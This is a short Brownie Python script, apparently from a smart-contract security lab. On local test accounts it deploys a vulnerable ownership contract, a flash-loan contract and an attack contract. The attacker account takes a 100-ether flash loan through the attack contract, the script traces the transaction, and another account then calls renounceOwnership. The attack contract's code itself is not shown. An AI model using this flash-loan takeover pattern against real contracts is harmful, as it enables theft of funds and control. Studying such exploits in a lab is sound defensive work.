from brownie import WhoIsTheOwner, FlashLoan, WhoIsTheOwnerAttack, accounts
from brownie.network.state import TxHistory


def main():
    owner = accounts[0]
    flashloan = accounts[1]
    user1 = accounts[2]
    attacker = accounts[3]

    flash_loan = FlashLoan.deploy({"from": flashloan})
    who_is_the_owner = WhoIsTheOwner.deploy({"from": owner, "value": "50 ether"})
    who_is_the_owner_attack = WhoIsTheOwnerAttack.deploy(who_is_the_owner, {"from": attacker})

    # take loan 100 ether
    flashloan.transfer(flash_loan,  "100 ether")
    who_is_the_owner_attack.takeLoan(flash_loan, 100e18,  {"from": attacker})
    history = TxHistory().copy()
    history[4].call_trace()

    breakpoint()

    who_is_the_owner.renounceOwnership({"from": user1})
    who_is_the_owner.owner()
